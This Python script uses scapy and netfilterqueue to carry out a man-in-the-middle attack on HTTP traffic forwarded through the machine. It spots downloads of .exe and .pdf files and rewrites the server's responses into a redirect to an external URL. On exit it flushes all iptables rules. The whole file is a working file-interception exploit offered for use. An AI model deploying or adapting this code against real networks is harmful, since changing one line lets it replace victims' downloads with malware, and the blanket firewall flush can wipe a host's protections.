#!/usr/bin/env python
import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP,TCP

WORDSLIST = [".exe",".pdf"]
LOAD = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.theverylastpageontheinternet.com/\n"
ack_list = []

def set_load(pkt, load):
   pkt[scapy.Raw].load = load
   #to avoid pkt to be corupted
   del pkt[IP].len
   del pkt[IP].chksum
   del pkt[TCP].chksum
   return pkt


def process_pkt(pkt) :
   scapy_pkt = IP(pkt.get_payload())
   if scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].dport == 80:
      if scapy_pkt.haslayer(scapy.Raw) :
         for word in WORDSLIST :
            if word in scapy_pkt[scapy.Raw].load :
              print("[!] Downloading a "+word)
              ack_list.append(scapy_pkt[TCP].ack)
   if scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].sport == 80:
      if scapy_pkt.haslayer(scapy.Raw) :
            if scapy_pkt[TCP].seq in ack_list:
               print("[!] DWLD resp for "+str(scapy_pkt[TCP].seq))
               #change the file
               edited_pkt = set_load(scapy_pkt, LOAD)
               pkt.set_payload(str(edited_pkt))
               ack_list.remove(scapy_pkt[TCP].seq )
               print("[+] file changed with "+ LOAD)
               print("-------------------------------------------------------------")

   pkt.accept()

# put recieved packets in a queue Quenum=0
try : 
   subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
   
   queue = netfilterqueue.NetfilterQueue()
   queue.bind(0, process_pkt)
   queue.run()

except KeyboardInterrupt:
   print("\n[-] Ctrl+C detected ....iptables flushed")
   #flush ip table to emmpty queue 0
   subprocess.call("iptables --flush",shell=True)
   print("[-] .....Quiting")
